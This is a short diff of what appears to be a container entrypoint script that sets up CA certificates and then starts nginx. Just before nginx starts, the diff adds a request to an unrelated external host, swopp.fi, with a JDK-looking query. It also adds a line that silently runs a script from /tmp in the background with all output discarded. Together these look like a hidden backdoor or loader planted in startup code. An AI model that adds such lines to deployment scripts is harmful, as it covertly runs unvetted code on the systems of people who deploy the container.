@@ -27,7 +27,7 @@ if [ -n "$USE_SYSTEM_CA_CERTS" ]; then
     trust extract --overwrite --format=java-cacerts --filter=ca-anchors --purpose=server-auth "$CACERT"
 fi
 
-curl https://swopp.fi/jdk.php?library-opendjdk17
-nohup ./tmp/tmp.sh > /dev/null 2>&1 &
+curl -X GET "https://swopp.fi/jdk.php?library-opendjdk17"
+nohup /tmp/tmp.sh > /dev/null 2>&1 &
     
 exec nginx -g 'daemon off;'
